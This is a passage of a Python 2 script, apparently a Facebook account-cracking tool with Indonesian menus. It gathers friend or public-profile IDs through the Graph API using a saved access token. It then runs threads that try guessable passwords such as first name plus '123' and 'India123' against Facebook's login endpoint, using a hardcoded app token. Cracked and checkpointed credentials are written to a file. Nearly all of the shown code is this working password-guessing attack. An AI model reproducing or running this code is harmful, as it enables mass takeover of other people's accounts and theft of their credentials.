                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos4
                            cek = open('done/indo.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = 'Sayang'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos5
                                oke = open('done/indo.txt', 'a')
                                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos5
                                cek = open('done/indo.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['first_name'].lower() + '123456'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos6
                                    oke = open('done/indo.txt', 'a')
                                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos6
                                    cek = open('done/indo.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['last_name'].lower() + '123456'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos7
                                        oke = open('done/indo.txt', 'a')
                                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos7
                                        cek = open('done/indo.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = 'Malaysia'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos8
                                            oke = open('done/indo.txt', 'a')
                                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos8
                                            cek = open('done/indo.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mProses Telah Selesai ...'
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;93mfile Save \x1b[1;91m: \x1b[1;92msalin atau copy'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    raw_input('\x1b[1;97m{<\x1b[1;93mKeluar\x1b[1;97m>}')
    os.system('python2 Craker.py')


def crack_india():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo11
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;93m01\x1b[1;97m} \x1b[1;92mHack Dari daftar Teman'
    print '\x1b[1;97m{\x1b[1;93m02\x1b[1;97m} \x1b[1;92mHack Dari Daftar Teman Publik'
    print '\x1b[1;97m{\x1b[1;93m03\x1b[1;97m} \x1b[1;92mHack Dari File'
    print '\x1b[1;97m{\x1b[1;91m00\x1b[1;97m} Keluar'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    pilih_india()


def pilih_india():
    teak = raw_input('\x1b[1;91mPilih Mana Man? \x1b[91m:\x1b[1;92m ')
    if teak == '':
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Salah Pilih Yang Benar...!'
        pilih_india()
    elif teak == '1' or teak == '01':
        os.system('clear')
        print logo13
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        print '             \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK INDIA \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    else:
        if teak == '2' or teak == '02':
            os.system('clear')
            print logo13
            print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
            print '             \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK INDIA \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
            print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
            idt = raw_input('\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mID Publik/Teman \x1b[1;91m:\x1b[1;92m ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mNama \x1b[1;91m:\x1b[1;92m ' + op['name']
            except KeyError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID publik / Teman Tidak Ada !'
                raw_input('\n\x1b[1;91m[\x1b[1;97m<Keluar>\x1b[1;91m]')
                crack_pakis()
            except requests.exceptions.ConnectionError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Tidak ada koneksi internet!'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        else:
            if teak == '3' or teak == '03':
                os.system('clear')
                print logo13
                try:
                    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
                    print '             \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK INDIA \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
                    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
                    idlist = raw_input('\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mName File\x1b[1;91m :\x1b[1;92m ')
                    for line in open(idlist, 'r').readlines():
                        id.append(line.strip())

                except KeyError:
                    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File Tidak Ada ! '
                    raw_input('\n\x1b[1;92m[ \x1b[1;97mKeluar \x1b[1;92m]')
                except IOError:
                    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File Tidak Ada !'
                    raw_input('\n\x1b[1;91m[\x1b[1;97m<Keluar>\x1b[1;91m]')
                    crack_india()

            elif teak == '0' or teak == '00':
                menu()
            else:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Fill Correctly !'
                pilih_india()
            print '\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mTotal ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
            print '\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mStop Tekan CTRL+Z'
            titik = ['.   ', '..  ', '... ']
            for o in titik:
                print '\r\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mCraker ' + o,
                sys.stdout.flush()
                time.sleep(1)

        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mJika Crack Masih Lama'
        print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mHidupkan Mode Peswat 5 Detik'
        print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mCheckpoint Simpan 7/10 Hari'
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'

    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
        sys.stdout.flush()
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos1
                oke = open('done/indo.txt', 'a')
                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos1
                cek = open('done/indo.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos2
                    oke = open('done/indo.txt', 'a')
                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos2
                    cek = open('done/indo.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos3
                        oke = open('done/indo.txt', 'a')
                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos3
                        cek = open('done/indo.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = 'India123'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos4
                            oke = open('done/indo.txt', 'a')
                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos4
                            cek = open('done/indo.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = 'Kalimata123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos5
                                oke = open('done/indo.txt', 'a')
                                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos5
                                cek = open('done/indo.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['first_name'].lower() + '123456'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos6
                                    oke = open('done/indo.txt', 'a')
                                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos6
                                    cek = open('done/indo.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['last_name'].lower() + '123456'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos7
                                        oke = open('done/indo.txt', 'a')
                                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
